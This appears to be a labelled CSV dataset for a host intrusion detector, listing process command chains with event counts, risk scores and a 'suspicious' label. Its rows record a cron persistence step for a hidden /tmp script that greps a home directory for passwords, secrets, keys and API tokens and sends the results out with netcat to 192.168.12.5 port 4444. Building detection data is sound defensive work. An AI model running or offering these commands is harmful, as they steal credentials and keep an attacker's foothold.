command_chain,count_read_event,count_write_event,count_sensitive_file_access_fails,count_socket_connect_event_successfully,count_socket_connect_event_fails,count_socket_create_event,count_file_modification_event_successfully,count_file_modification_event_fails,count_file_creation_event,count_link_event,count_symlink_event,count_dir_creation_event,count_dir_remove_event,count_mknod_create_event,count_rename_event,count_auth_event_successfully,count_auth_event_fails,count_passwd_change_event_successfully,count_passwd_change_event_fails,count_user_change_event_successfully,count_user_change_event_fails,count_do_not_update_atime,count_was_modified_time_changed,count_owner_changed,count_group_changed,count_suid_set,count_suid_cleared,count_sgid_set,count_sgid_cleared,count_sticky_set,count_sticky_cleared,count_user_write_added,count_user_write_removed,count_user_read_added,count_user_read_removed,count_user_exec_added,count_user_exec_removed,count_group_write_added,count_group_write_removed,count_group_exec_added,count_group_exec_removed,count_world_write_been_added,count_world_read_been_added,count_world_exec_been_added,count_external_ip,is_priviliged_port,count_sensitive_file,count_is_linked_to_sensitive_file,count_linked_file_SGID_or_SUID,count_atime_flag_been_set,count_modified_time_been_changed,is_current_dir_world_writable,is_target_dir_world_writable,is_in_memory_path,is_cross_user_link,is_dev_backdoor,is_fake_device,argv_has_network,argv_is_ip,argv_has_encoding,argv_is_net_tool,argv_is_sudo,argv_entropy,risk_score,label
./cron_miner.sh -> cat -> chmod +x /tmp/.system_maintenance.sh -> crontab -l -> crontab - -> cron_miner.sh,0,0,0,8,0,8,2,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,4,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.858999400739174,4.0540345841748975,suspicious
cat,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,1.6644977792004616,1.763402670338989,suspicious
chmod +x /tmp/.system_maintenance.sh,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.858999400739174,1.860896728125912,suspicious
crontab -l,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.343767422366671,3.2257276458853577,suspicious
crontab -,0,0,0,3,0,3,2,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.24509868160094,3.564521551522884,suspicious
crontab -l,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.343767422366671,3.2257276458853577,suspicious
cron_miner.sh,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,,,,,,,0.0,suspicious
cron -> /bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,6,0,0,28,0,44,5,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0,0,3,4,17,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.1000909583954077,5.234365582468995,suspicious
cron -> /bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,2,0,0,10,0,16,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,1,4,6,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.1000909583954077,4.457482440261152,suspicious
/bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,1,0,0,6,0,7,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,3,6,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.1000909583954077,3.991943468322975,suspicious
/tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,0,0,0,3,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,5,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.1000909583954077,3.717225032327759,suspicious
grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,3.1000909583954077,1.8946236936214755,suspicious
cat /tmp/.temp_scan,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.541977773207955,1.835934059370504,suspicious
nc -w 60 192.168.12.5 4444,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0.0,0.0,0.0,2.424338178594896,3.207295797989175,suspicious
